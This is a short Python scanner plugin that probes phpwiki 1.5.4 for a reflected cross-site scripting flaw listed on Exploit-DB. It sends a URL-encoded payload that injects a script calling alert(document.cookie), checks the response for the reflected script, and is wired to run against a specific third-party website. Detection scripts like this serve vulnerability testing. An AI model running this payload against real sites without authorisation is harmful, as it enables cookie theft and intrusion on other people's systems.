#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = ali
#_FileName_ = phpwiki 1.5.4 - Cross Site Scripting.py
#https://www.exploit-db.com/exploits/38027/

import re
def assign(service, arg):
    if service == "phpwiki": 
        return True, arg 

def audit(arg):
    payload='phpwiki/index.php?pagename=%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3C!-- '
    url=arg+payload
    code,head,body,errcode,fina_url=curl.curl(url)
    if code == 200:
        m = re.search('var pagename  = \'</script><script>alert\(document\.cookie\)</script><!--\'', body)
        if m:
            security_warning(url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('phpwiki', 'http://www.mtjezreel.com/')[1])